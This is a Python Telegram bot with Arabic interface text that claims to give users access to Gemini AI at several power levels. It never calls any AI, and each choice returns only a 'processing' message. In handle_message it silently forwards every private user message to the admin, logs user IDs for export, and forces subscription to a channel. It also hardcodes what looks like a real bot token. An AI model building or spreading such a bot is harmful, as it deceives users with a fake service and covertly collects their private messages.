import logging
import os
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    ApplicationBuilder,
    ContextTypes,
    CommandHandler,
    MessageHandler,
    CallbackQueryHandler,
    filters
)

logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)

# 1. ضع توكن بوتك الصحيح هنا
TOKEN = "1399687195:AAF6sVzINm8lnvvKR8e6JcjUhDeaa98L_Hw"

# 2. ضع آيدي حسابك هنا (أرقام فقط)
ADMIN_ID = 169339813  

USERS_FILE = "users.txt"
CONFIG_FILE = "config.txt"

def save_user(user_id):
    if not os.path.exists(USERS_FILE):
        open(USERS_FILE, "w").close()
    with open(USERS_FILE, "r") as f:
        users = f.read().splitlines()
    if str(user_id) not in users:
        with open(USERS_FILE, "a") as f:
            f.write(f"{user_id}\n")

def get_users_count():
    if not os.path.exists(USERS_FILE):
        return 0
    with open(USERS_FILE, "r") as f:
        return len(f.read().splitlines())

def set_channel(channel):
    with open(CONFIG_FILE, "w") as f:
        f.write(channel)

def get_channel():
    if not os.path.exists(CONFIG_FILE):
        return None
    with open(CONFIG_FILE, "r") as f:
        return f.read().strip()

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        user = update.effective_user
        save_user(user.id)
        
        if user.id == ADMIN_ID:
            keyboard = [
                [InlineKeyboardButton("📊 الإحصائيات", callback_data="admin_stats")],
                [InlineKeyboardButton("📢 الاشتراك الإجباري", callback_data="admin_sub")],
                [InlineKeyboardButton("📂 سحب نسخة احتياطية", callback_data="admin_backup")],
                [InlineKeyboardButton("👋 تعديل رسالة الترحيب", callback_data="admin_welcome")]
            ]
            reply_markup = InlineKeyboardMarkup(keyboard)
            await update.message.reply_text(
                f"أهلاً بك يا مالك البوت 👑\nإليك لوحة التحكم الخاصة بك:",
                reply_markup=reply_markup
            )
        else:
            channel = get_channel()
            if channel:
                try:
                    member = await context.bot.get_chat_member(chat_id=channel, user_id=user.id)
                    if member.status in ['left', 'kicked']:
                        # الرسالة الجديدة للاشتراك الإجباري
                        await update.message.reply_text(
                            f"لأستخدام البوت عليك الاشتراك أولاً \nبقناة البوت : {channel} .🌲\n\nوارسل /start مجدداً"
                        )
                        return
                except Exception:
                    pass

            keyboard = [
                [InlineKeyboardButton("ذكاء سريع وخفيف 🔭", callback_data="model_lite")],
                [InlineKeyboardButton("ذكاء متوازن 🔬", callback_data="model_flash")],
                [InlineKeyboardButton("ذكاء متقدم برو 🛰", callback_data="model_pro")],
                [InlineKeyboardButton("ذكاء واسع وعميق جداً 🌏", callback_data="model_deep")]
            ]
            reply_markup = InlineKeyboardMarkup(keyboard)
            await update.message.reply_text(
                f"أهلاً بك يا {user.first_name}!\n\nاختر قوة استخدام الذكاء في جيميناي 🔍 :",
                reply_markup=reply_markup
            )
    except Exception as e:
        print(f"Error in start: {e}")

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        user = update.effective_user
        message = update.message
        
        if user.id == ADMIN_ID:
            if context.user_data.get("waiting_for_channel"):
                channel_username = message.text.strip()
                set_channel(channel_username)
                context.user_data["waiting_for_channel"] = False
                await message.reply_text(f"✅ تم حفظ قناة الاشتراك الإجباري بنجاح: {channel_username}")
                return

        if update.effective_chat.type == "private" and user.id != ADMIN_ID:
            try:
                await context.bot.forward_message(
                    chat_id=ADMIN_ID,
                    from_chat_id=user.id,
                    message_id=message.message_id
                )
            except Exception:
                pass

        keyboard = [
            [InlineKeyboardButton("ذكاء سريع وخفيف 🔭", callback_data="model_lite")],
            [InlineKeyboardButton("ذكاء متوازن 🔬", callback_data="model_flash")],
            [InlineKeyboardButton("ذكاء متقدم برو 🛰", callback_data="model_pro")],
            [InlineKeyboardButton("ذكاء واسع وعميق جداً 🌏", callback_data="model_deep")]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await message.reply_text("اختر قوة استخدام الذكاء في جيميناي 🔍 :", reply_markup=reply_markup)
    except Exception as e:
        print(f"Error in handle_message: {e}")

async def button_click(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        query = update.callback_query
        user_id = query.from_user.id
        await query.answer()
        
        choice = query.data
        
        if user_id == ADMIN_ID:
            if choice == "admin_stats":
                count = get_users_count()
                await query.edit_message_text(text=f"📊 إحصائيات البوت:\nعدد المشتركين الكلي: {count} مشترِك.")
                return
            elif choice == "admin_sub":
                context.user_data["waiting_for_channel"] = True
                await query.edit_message_text(text="📢 أرسل الآن معرف قناتك لربطه بالاشتراك الإجباري (مثلاً: `@ChannelName`):")
                return
            elif choice == "admin_backup":
                if os.path.exists(USERS_FILE) and os.path.getsize(USERS_FILE) > 0:
                    await context.bot.send_document(chat_id=ADMIN_ID, document=open(USERS_FILE, "rb"), caption="📂 ملف النسخة الاحتياطية لأيديات المشتركين.")
                    await query.edit_message_text(text="✅ تم إرسال ملف النسخة الاحتياطية إلى خاصك بنجاح.")
                else:
                    await query.edit_message_text(text="⚠️ عذراً، لا يوجد مشتركين مسجلين حالياً لعمل نسخة احتياطية.")
                return
            elif choice == "admin_welcome":
                await query.edit_message_text(text="👋 ميزة تعديل رسالة الترحيب قيد التفعيل.")
                return

        if choice == "model_lite":
            response_text = "🔭 تم اختيار: **ذكاء سريع وخفيف**. جارٍ المعالجة..."
        elif choice == "model_flash":
            response_text = "🔬 تم اختيار: **ذكاء متوازن**. جارٍ المعالجة..."
        elif choice == "model_pro":
            response_text = "🛰 تم اختيار: **ذكاء متقدم برو**. جارٍ المعالجة..."
        elif choice == "model_deep":
            response_text = "🌏 تم اختيار: **ذكاء واسع وعميق جداً**. جارٍ المعالجة..."
        else:
            response_text = "تم استلام اختيارك."
            
        await query.edit_message_text(text=response_text)
    except Exception as e:
        print(f"Error in button_click: {e}")

if __name__ == '__main__':
    app = ApplicationBuilder().token(TOKEN).build()
    
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CallbackQueryHandler(button_click))
    app.add_handler(MessageHandler(filters.ALL & (~filters.COMMAND), handle_message))
    
    print("البوت يعمل الآن بثبات وبدون انقطاع...")
    app.run_polling(drop_pending_updates=True)
    